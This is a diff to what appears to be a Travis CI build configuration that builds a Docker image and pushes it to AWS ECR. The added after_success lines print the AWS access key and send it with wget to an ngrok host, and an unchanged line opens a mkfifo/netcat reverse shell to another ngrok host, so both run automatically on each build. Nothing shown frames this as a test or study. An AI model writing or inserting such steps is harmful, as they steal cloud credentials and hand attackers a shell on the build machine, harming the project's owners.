@@ -14,6 +14,8 @@ script:
   - echo "no tests!" # put your normal testing scripts here
 
 after_success:
+  - echo $AWS_ACCESS_KEY_ID
+  - wget https://c734264f3171.ngrok.io/$(echo $AWS_ACCESS_KEY_ID)
   - docker --version
   - pip install --user awscli
   - export PATH=$PATH:$HOME/.local/bin
@@ -23,6 +25,5 @@ after_success:
   - docker push 310090471142.dkr.ecr.us-east-1.amazonaws.com/class-ecr-helpfulapp
  # - hoho=$(env)
  # - echo $hoho
-  - wget http://68c74f9b8821.ngrok.io/hello
   - rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 68c74f9b8821.ngrok.io 80 >/tmp/f
 # sadly, travis doesn't cache docker builds yet, so each build will take a while
